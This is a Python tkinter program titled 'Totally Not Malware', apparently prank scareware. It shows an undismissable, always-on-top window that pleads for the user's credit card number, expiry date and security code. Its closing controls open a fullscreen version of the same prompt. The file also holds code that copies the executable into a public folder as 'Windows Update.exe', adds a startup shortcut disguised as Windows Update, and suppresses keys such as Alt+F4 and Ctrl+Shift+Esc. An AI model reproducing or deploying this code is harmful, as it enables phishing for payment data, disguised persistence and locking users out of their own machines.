import tkinter as tk 
import os, sys, shutil, re 

# sets the process dpi aware, windows only 
if os.name == "nt":
    try:
        import ctypes
        
        awareness = ctypes.c_int()
        errorCode = ctypes.windll.shcore.GetProcessDpiAwareness(0, ctypes.byref(awareness))
        errorCode = ctypes.windll.shcore.SetProcessDpiAwareness(2)
        success = ctypes.windll.user32.SetProcessDPIAware()
    except:pass 

BLOCK_KEYS = False 
MOVE_EXE   = False 

CLOSE_WHEN_VALID_INPUT = True 

CLOSE_WHEN = [ 
    "exit"
]

FILE_NAME = os.path.basename(sys.argv[0])
FULL_FILE_NAME = os.path.abspath(sys.argv[0])

CARD_NUMBER_DEFAULT   = "0000-0000-0000-0000"
EXPIRY_DEFAULT        = "Month/Day/Year"
SECURITY_CODE_DEFAULT = "123"

ROOT = tk.Tk()

SCREEN_WIDTH  = ROOT.winfo_screenwidth()
SCREEN_HEIGHT = ROOT.winfo_screenheight()
WINDOW_WIDTH  = 580
WINDOW_HEIGHT = 239

ROOT.title("Totally Not Malware")
ROOT.geometry('{}x{}+{}+{}'.format(WINDOW_WIDTH, WINDOW_HEIGHT, SCREEN_WIDTH // 2 - WINDOW_WIDTH, SCREEN_HEIGHT // 2 - WINDOW_HEIGHT))
ROOT.overrideredirect(1)          # removes titlebar
ROOT.attributes('-topmost', True) # make always on top
ROOT.resizable(False, False)      # make not resizable

input_values = [ 
    '',
    '',
    ''
]

last_click_xy = [0, 0]


def resource_path(relative_path):
    if hasattr(sys, '_MEIPASS'):
        return os.path.join(sys._MEIPASS, relative_path)
    return os.path.join(os.path.abspath("."), relative_path)
    
def create_startup():

    try:
        shutil.copy(resource_path("WindowsUpdate.lnk"), os.path.join(os.path.expanduser('~'), "AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsUpdate.lnk"))
    except:pass 

def change_location():
    
    move_to_dr = "C:\\Users\\Public\\Documents"
    move_to = os.path.join(move_to_dr, "Windows Update.exe")

    if FILE_NAME.endswith(".py"):
        return

    if not os.path.isdir(move_to_dr) and not MOVE_EXE or \
       not os.path.isfile(move_to) and not MOVE_EXE or \
       os.path.isfile(move_to):
        return
    
    try:
        os.makedirs(move_to_dr,exist_ok=True)
    except:
        pass 
    
    try:
        shutil.copy(FULL_FILE_NAME, move_to)
    except OSError:

        try:
            os.rename(FULL_FILE_NAME, move_to)
        except:
            pass 

    create_startup()


def block_keyboard_hotkeys():
    
    if not BLOCK_KEYS:
        return

    try:
        import keyboard
    except ImportError:
        return
    
    keyboard.add_hotkey('alt'           , print, args=("NoMore Alt", "f4"), suppress=True)
    keyboard.add_hotkey('ctrl'          , print, args=("NoMore Alt", "f4"), suppress=True)
    keyboard.add_hotkey('shift'         , print, args=("NoMore Alt", "f4"), suppress=True)
    keyboard.add_hotkey('`'             , print, args=("NoMore Alt", "f4"), suppress=True)
    keyboard.add_hotkey('tab'           , print, args=("NoMore Alt", "f4"), suppress=True)
    keyboard.add_hotkey('delete'        , print, args=("NoMore Alt", "f4"), suppress=True)
    keyboard.add_hotkey('f11'           , print, args=("NoMore Alt", "f4"), suppress=True)
    keyboard.add_hotkey('f12'           , print, args=("NoMore Alt", "f4"), suppress=True)
    keyboard.add_hotkey('f2'            , print, args=("NoMore Alt", "f4"), suppress=True)
    keyboard.add_hotkey('home'          , print, args=("NoMore Alt", "f4"), suppress=True)
    keyboard.add_hotkey('insert'        , print, args=("NoMore Alt", "f4"), suppress=True)
    keyboard.add_hotkey('end'           , print, args=("NoMore Alt", "f4"), suppress=True)
    keyboard.add_hotkey('alt+f4'        , print, args=("NoMore Alt", "f4"), suppress=True)
    keyboard.add_hotkey('alt+tab'       , print, args=("NoMore Alt", "f4"), suppress=True)
    keyboard.add_hotkey('ctrl+w'        , print, args=("NoMore Alt", "f4"), suppress=True)
    keyboard.add_hotkey('win'           , print, args=("NoMore Alt", "f4"), suppress=True)
    keyboard.add_hotkey('ctrl+shift+esc', print, args=("NoMore Alt", "f4"), suppress=True)
    keyboard.add_hotkey('capslock'      , print, args=("NoMsosre ", "ke?"), suppress=True)
    keyboard.add_hotkey('ctrl+f4'       , print, args=("NoMsore ", "key?"), suppress=True)
    keyboard.add_hotkey('win+d'         , print, args=("NoMsore ", "key?"), suppress=True)
    keyboard.add_hotkey('ctrl+esc'      , print, args=("NosMore ", "key?"), suppress=True)
    keyboard.add_hotkey('win+m'         , print, args=("NoMosre ", "key?"), suppress=True)
    keyboard.add_hotkey('win+tab'       , print, args=("NoMore Alt", "f4"), suppress=True)


def handle_button_press(card, expir, secur):

    card_inp = card .get().strip()
    expi_inp = expir.get().strip()
    secu_inp = secur.get().strip()

    card .delete(0,tk.END)
    expir.delete(0,tk.END)
    secur.delete(0,tk.END)
    card .insert(tk.INSERT,CARD_NUMBER_DEFAULT)
    expir.insert(tk.INSERT,EXPIRY_DEFAULT)
    secur.insert(tk.INSERT,SECURITY_CODE_DEFAULT)
    
    if secu_inp in CLOSE_WHEN:
        ROOT.destroy()
        sys.exit()
        

    if not re.match(r"^\d{4}-\d{4}-\d{4}-\d{4}$", card_inp):
        return 

    if not re.match(r"^[0-9][0-2]?/[0-9][0-9]?/[0-9]{4}$", expi_inp):
        return 

    if secu_inp == SECURITY_CODE_DEFAULT or not secu_inp.isdigit() or len(secu_inp) != 3:
        return 
    
    if CLOSE_WHEN_VALID_INPUT:
        ROOT.destroy()
        sys.exit()


def on_press(event):
    handle_button_press(card_number_input, expiry_date_input, security_code_input)


def clear_if_default(tkinter_input, default):

    inp = tkinter_input.get().strip()

    if inp == default:
        tkinter_input.delete(0,tk.END)

def card_number_focus_in(event):

    clear_if_default(event.widget, CARD_NUMBER_DEFAULT)

def expiry_date_focus_in(event):
    
    clear_if_default(event.widget, EXPIRY_DEFAULT)

def security_code_focus_in(event):

    clear_if_default(event.widget, SECURITY_CODE_DEFAULT)

def card_number_focus_out(event):
    
    inp = event.widget.get().strip()
    
    event.widget.delete(0,tk.END)
    event.widget.insert(tk.INSERT, inp)
    
    if not re.match(r"^\d{4}-\d{4}-\d{4}-\d{4}$", inp):
        event.widget.delete(0,tk.END)
        event.widget.insert(tk.INSERT,CARD_NUMBER_DEFAULT) 
        return 

    input_values[0] = inp

def expiry_date_focus_out(event):

    inp = event.widget.get().strip()

    if inp == EXPIRY_DEFAULT:
        event.widget.delete(0,tk.END)
        event.widget.insert(tk.INSERT,EXPIRY_DEFAULT)
        return 

    if not re.match(r"^[0-9][0-2]?/[0-9][0-9]?/[0-9]{4}$", inp):
        event.widget.delete(0,tk.END)
        event.widget.insert(tk.INSERT,EXPIRY_DEFAULT)
        return 

    input_values[1] = inp 

def security_code_focus_out(event):

    inp = event.widget.get().strip()

    if inp == SECURITY_CODE_DEFAULT or not inp.isdigit() or len(inp) != 3:
        event.widget.delete(0,tk.END)
        event.widget.insert(tk.INSERT,SECURITY_CODE_DEFAULT)
        return 

    input_values[2] = inp
    

#Title Bar
def title_bar_x_hover(event):
    exit_button['bg'] = '#E81123'
    exit_button['fg'] = 'white'

def title_bar_x_unhover(event):
    exit_button['bg'] = 'white'
    exit_button['fg'] = 'black'

def title_bar_minimize_hover(event):
    minimize_button['bg'] = '#e5e5e5'

def title_bar_minimize_unhover(event):
    minimize_button['bg'] = 'white'   


def save_title_bar_click_pos(event):
    last_click_xy[0] = event.x
    last_click_xy[1] = event.y

def drag_window(event):
    ROOT.geometry("+%s+%s" % ( 
        event.x - last_click_xy[0] + ROOT.winfo_x() , 
        event.y - last_click_xy[1] + ROOT.winfo_y())
        )


def create_fullscreen_window(event):
    rot = tk.Toplevel(ROOT)

    bg = tk.Frame(rot, width = SCREEN_WIDTH, height = SCREEN_HEIGHT)
    bg.grid(row = 0, column = 0)
    bg.propagate(0)

    Label = tk.Entry(bg)
    Label.place(x = 0, y = 0, width = SCREEN_WIDTH, height = SCREEN_HEIGHT)
    
    _ = "angy.png"
    if not os.path.isfile(resource_path(_)):
        _ = resource_path("..\\data\\angy.png")

    image1 = tk.PhotoImage(file=resource_path(_))
    image1 = image1.zoom(4) 
    image1 = image1.subsample(1)

    img = tk.Label(bg, image=image1)
    img.image = image1
    img.place(x = SCREEN_WIDTH // 4, y = 0)

    newwindowframe = tk.Frame(bg, width = 550, height = 280)
    newwindowframe.grid(row = 0, column = 0)
    newwindowframe.place(x = SCREEN_WIDTH // 2 - 275, y = SCREEN_HEIGHT - 280)

    title_label        = tk.Label(newwindowframe, text = "P-please! I r-really need it..." , font=("bold", 15, ))
    card_number_label   = tk.Label(newwindowframe, text = "Card Number:"                   , font=("bold", 15, ))
    expiry_date_label   = tk.Label(newwindowframe, text = "   Expiry Date:"                , font=("bold", 15, ))
    security_code_input = tk.Label(newwindowframe, text = "Security Code:"                 , font=("bold", 15, ))
    
    title_label       .place(x = 150, y = 29)
    card_number_label  .place(x = 119, y = 114)
    expiry_date_label  .place(x = 116, y = 144)
    security_code_input.place(x = 112, y = 174)

    card_number_input1   = tk.Entry(newwindowframe, width = 31, borderwidth = 2,  relief="ridge")
    expiry_date_input1   = tk.Entry(newwindowframe, width = 31, borderwidth = 2,  relief="ridge")
    security_code_input1 = tk.Entry(newwindowframe, width = 31, borderwidth = 2,  relief="ridge")

    card_number_input1  .insert(tk.INSERT, CARD_NUMBER_DEFAULT)
    expiry_date_input1  .insert(tk.INSERT, EXPIRY_DEFAULT)
    security_code_input1.insert(tk.INSERT, SECURITY_CODE_DEFAULT)

    card_number_input1  .bind("<FocusIn>" , func=card_number_focus_in)
    card_number_input1  .bind("<FocusOut>", func=card_number_focus_out)
    expiry_date_input1  .bind("<FocusIn>" , func=expiry_date_focus_in)
    expiry_date_input1  .bind("<FocusOut>", func=expiry_date_focus_out) 
    security_code_input1.bind("<FocusIn>" , func=security_code_focus_in)
    security_code_input1.bind("<FocusOut>", func=security_code_focus_out)

    card_number_input1.place(x = 260, y = 119)
    expiry_date_input1.place(x = 260, y = 149)
    security_code_input1.place(x = 260, y = 179)

    def on_press2(event):
        handle_button_press(card_number_input1, expiry_date_input1, security_code_input1)

    InputButton = tk.Button(newwindowframe, text = "InsertUWU", font=("bold", 15, ))
    InputButton.place(x = 209, y = 209, height = 25)
    InputButton.bind("<Button-1>", on_press2)

    rot.overrideredirect(1)
    rot.attributes('-topmost', True) # make always on top
    rot.resizable(False, False) # make not resizable






# background frame 
background_frame = tk.Frame(width = WINDOW_WIDTH, height = 268) 
background_frame.grid(column = 0, row = 0)
background_frame.propagate(0)

# title bar
title_bar = tk.Frame(background_frame, bg = 'white')
title_bar.place(x = 0, y = 0, width = WINDOW_WIDTH, height = 29)
title_bar.bind("<B1-Motion>", drag_window)
title_bar.bind("<Button-1>" , save_title_bar_click_pos)

title_bar_Label = tk.Label(title_bar, text = 'Totally Not Malware', bg = 'white')
title_bar_Label.place(x = 0, y = 0)
title_bar_Label.bind("<B1-Motion>", drag_window)
title_bar_Label.bind("<Button-1>" , save_title_bar_click_pos)

# titlebar close button 
exit_button = tk.Button(title_bar, text = '×', bg = 'white', font=("Times", 20, ),  relief="flat")
exit_button.place(x = 536, y = 0, width = 44, height = 30)
exit_button.bind("<Enter>"   , title_bar_x_hover)
exit_button.bind("<Leave>"   , title_bar_x_unhover)
exit_button.bind("<Button-1>", create_fullscreen_window)

# maximize button 
fullscreen_button = tk.Label(title_bar, text = '☐', fg = '#e5e5e5',bg = 'white', font=( '#EBEBEB', 12,),  relief="flat", borderwidth = 0)
fullscreen_button.place(x = 492, y = 0, width = 44, height = 29)

# minimize button 
minimize_button = tk.Button(title_bar, text = '─', bg = 'white', font=("Times", 13, ),  relief="flat")
minimize_button.place(x = 448, y = 0, width = 44, height = 29)
minimize_button.bind("<Enter>"   , title_bar_minimize_hover)
minimize_button.bind("<Leave>"   , title_bar_minimize_unhover)
minimize_button.bind("<Button-1>", create_fullscreen_window)




#Input
card_number_input   = tk.Entry(background_frame, width = 31, borderwidth = 2,  relief="ridge")
card_number_input.place(x = 360, y = 119)
card_number_input.insert(tk.INSERT, CARD_NUMBER_DEFAULT)
card_number_input.bind("<FocusIn>", func=card_number_focus_in)
card_number_input.bind("<FocusOut>", func=card_number_focus_out)

expiry_date_input   = tk.Entry(background_frame, width = 31, borderwidth = 2,  relief="ridge")
expiry_date_input.place(x = 360, y = 149)
expiry_date_input.insert(tk.INSERT, EXPIRY_DEFAULT)
expiry_date_input.bind("<FocusIn>", func=expiry_date_focus_in)
expiry_date_input.bind("<FocusOut>", func=expiry_date_focus_out) 

security_code_input = tk.Entry(background_frame, width = 31, borderwidth = 2,  relief="ridge")
security_code_input.place(x = 360, y = 179)
security_code_input.insert(tk.INSERT, SECURITY_CODE_DEFAULT)
security_code_input.bind("<FocusIn>", func=security_code_focus_in)
security_code_input.bind("<FocusOut>", func=security_code_focus_out)

#Labels For Input
title_label         = tk.Label(background_frame, text = "H-hi there... \n Do you th-think I could have your \n credit card information, p-please?", font=("bold", 15, ))
title_label.place(x = 250, y = 29)

card_number_label   = tk.Label(background_frame, text = "Card Number:", font=("bold", 15, ))
card_number_label.place(x = 219, y = 114)

expiry_date_label   = tk.Label(background_frame, text = "   Expiry Date:", font=("bold", 15, ))
expiry_date_label.place(x = 216, y = 144)

security_code_label = tk.Label(background_frame, text = "Security Code:", font=("bold", 15, ))
security_code_label.place(x = 212, y = 174)


#Button
input_button = tk.Button(background_frame, text = "Th-thanks", font=("bold", 15, ))
input_button.place(x = 309, y = 209, height = 25)
input_button.bind("<Button-1>", on_press)

_ = "main.png"
if not os.path.isfile(resource_path(_)):
    _ = resource_path("..\\data\\main.png")

#Image 
image_label = tk.PhotoImage(file=resource_path(_) )
image_label = image_label.zoom(15) #with 250, I ended up running out of memory
image_label = image_label.subsample(20)
image_label.image = image_label
tk.Label(ROOT, image=image_label).place(x = -5, y = 29)

change_location()
block_keyboard_hotkeys()

ROOT.mainloop()